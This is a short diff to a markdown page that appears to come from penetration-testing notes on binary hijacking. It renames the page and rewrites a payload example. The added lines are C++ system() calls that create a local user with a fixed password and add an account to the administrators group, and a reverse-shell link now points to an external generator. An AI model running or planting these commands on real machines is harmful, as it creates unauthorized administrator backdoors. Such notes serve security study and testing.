@@ -1,5 +1,5 @@
 ---
-title: Target reconnaissance
+title: Binary Hijacking
 description: Inspect client foothold in order to perform Client side attacks
 tags:
   - Exploitation
@@ -28,16 +28,12 @@ int main ()
 ## Payload example
 
 +++ Create new admin user
-
+```cpp
+i = system ("net user rootking password123! /add");
+i = system ("net localgroup administrators cvericel /add");
 ```
-"net user rootking password123! /add" / "net localgroup administrators cvericel /add"
-```
-
 +++ Reverse shell
-
-[!ref icon=":rocket:"](encode-pwsh-rev-shell.md)
-
-
+[!ref icon=":rocket:"](https://www.revshells.com)
 +++
 
 ## Cross-Compile the C Code to a 64-bit application
